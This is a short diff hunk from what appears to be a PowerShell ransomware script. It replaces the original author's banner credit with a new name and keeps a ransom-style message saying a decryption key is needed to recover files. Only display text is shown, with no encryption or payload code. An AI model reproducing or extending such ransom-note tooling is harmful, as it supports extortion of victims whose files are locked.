@@ -35,7 +35,7 @@ Write-Host "
                         \___/(_)                                             "
 Write-Host "
 ===============================================================================
-           Written by @beigeworm - Follow on github - Discord : egieb
+                By : Okaidi86
 ==============================================================================="
 Write-Host "`nYou will need a deryption key to recover the files..`n"
 
